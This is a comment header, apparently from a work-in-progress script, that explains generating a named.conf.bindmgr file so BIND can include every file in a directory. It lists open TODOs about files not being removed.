# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.
